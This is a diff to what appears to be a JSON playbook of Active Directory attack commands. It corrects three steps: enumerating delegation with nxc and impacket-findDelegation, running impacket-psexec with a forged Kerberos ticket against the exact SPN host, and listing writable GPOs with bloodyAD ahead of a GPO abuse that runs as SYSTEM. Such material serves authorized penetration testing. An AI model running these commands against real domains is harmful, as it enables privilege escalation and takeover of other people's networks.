@@ -908,8 +908,8 @@
     },
     {
      "tool": "nxc",
-     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --trusted-for-delegation --trusted-to-auth",
-     "note": "Unconstrained + constrained delegation principals — a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation)."
+     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --trusted-for-delegation",
+     "note": "Accounts trusted for delegation — a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation). --trusted-to-auth is NOT a netexec flag; for the full constrained/RBCD (T2A4D) picture run impacket-findDelegation -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'."
     },
     {
      "tool": "nxc",
@@ -1819,8 +1819,8 @@
     },
     {
      "tool": "sh",
-     "run": "export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass '{{target_sam}}'",
-     "note": "Put the ticket to work: -k -no-pass with the ccache gives you execution as the impersonated user."
+     "run": "export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass '{{spn_host}}'",
+     "note": "Put the ticket to work with -k -no-pass. The host MUST be the exact FQDN you forged the SPN for above ({{spn_host}}) — Kerberos matches the ticket by SPN, so a SAM name or a bare IP silently fails with KRB_AP_ERR_* / no output."
     }
    ]
   },
@@ -2524,9 +2524,9 @@
      "note": "Add an immediate scheduled task to a GPO you can write. -gpo-id is the GUID BloodHound named. It runs as SYSTEM on the next gpupdate."
     },
     {
-     "tool": "netexec",
-     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M gpo_privesc",
-     "note": "nxc enumerates writable GPOs and their linked OUs so you know what the abuse will hit before you fire it."
+     "tool": "bloodyAD",
+     "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get writable --detail",
+     "note": "List every object this account can write to — the groupPolicyContainer entries are the writable GPOs, and their cn is the {{gpo_id}} the pygpoabuse command needs. netexec has NO gpo_privesc module (it aborts); bloodyAD is the real, runnable enumerator. BloodHound's 'GPO' edges show the same on the Domain tab."
     }
    ]
   },
